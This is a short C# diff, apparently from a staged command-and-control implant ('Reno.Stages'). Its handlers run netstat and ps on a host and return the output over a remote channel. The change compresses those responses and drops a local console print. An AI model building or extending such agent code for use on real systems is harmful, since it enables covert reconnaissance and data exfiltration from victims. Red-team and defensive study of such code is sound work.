@@ -147,7 +147,7 @@ namespace Reno.Stages
                         netstat.StartInfo = netstatInfo;
                         netstat.Start();
                         string netstatOutput = netstat.StandardOutput.ReadToEnd();
-                        byte[] netstatBytes = Encoding.UTF8.GetBytes(netstatOutput);
+                        byte[] netstatBytes = channel.Compress(Encoding.UTF8.GetBytes(netstatOutput));
                         CommHeader netstatHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, netstatBytes.Length);
                         channel.SendHeader(netstatHeader);
                         channel.SendBytes(netstatBytes);
@@ -162,8 +162,7 @@ namespace Reno.Stages
                         ps.StartInfo = psInfo;
                         ps.Start();
                         string output = ps.StandardOutput.ReadToEnd();
-                        Console.WriteLine(output);
-                        byte[] psBytes = Encoding.UTF8.GetBytes(output);
+                        byte[] psBytes = channel.Compress(Encoding.UTF8.GetBytes(output));
                         CommHeader psHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, psBytes.Length);
                         channel.SendHeader(psHeader);
                         channel.SendBytes(psBytes);
